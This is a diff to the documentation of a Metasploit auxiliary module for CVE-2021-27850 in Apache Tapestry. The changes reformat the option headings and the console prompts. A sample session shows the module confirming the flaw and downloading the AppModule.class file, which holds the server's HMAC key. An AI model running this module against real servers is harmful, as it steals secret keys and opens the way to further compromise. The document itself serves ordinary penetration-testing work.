@@ -19,30 +19,30 @@ List the steps needed to make sure this thing works
 
 ## Options
 
-**RHOSTS**
+### RHOSTS
 
 Set the target host.
 
-**RPORT**
+### RPORT
 
 Set the target port. The default value is `8080` which is the default value used by Tapestry server.
 
-**TARGETED_CLASS**
+### TARGETED_CLASS
 
 This is not a required option and by default the value is `AppModule.class` which is also the default java class of by Tapestry server where the hmac key is set. But in case you want to target a different java class, it can be done by setting this option with another class name.
 
 ## Scenarios
 
 ```
-msf6 > use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set rhost 172.16.215.155rhost => 172.16.215.155
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set targeturi /hotels
+msf > use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set rhost 172.16.215.155rhost => 172.16.215.155
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set targeturi /hotels
 targeturi => /hotels
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > check
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > check
 
 [+] Java file leak at 172.16.215.155:8080/hotels/assets/app/bf78ed9f/services/AppModule.class/
 [+] 172.16.215.155:8080 - The target is vulnerable.
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > run
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > run
 [*] Running module against 172.16.215.155
 
 [+] Apache Tapestry class file saved at /user/.msf4/loot/20210721173200_default_172.16.215.155_tapestry.AppModu_493080.bin.
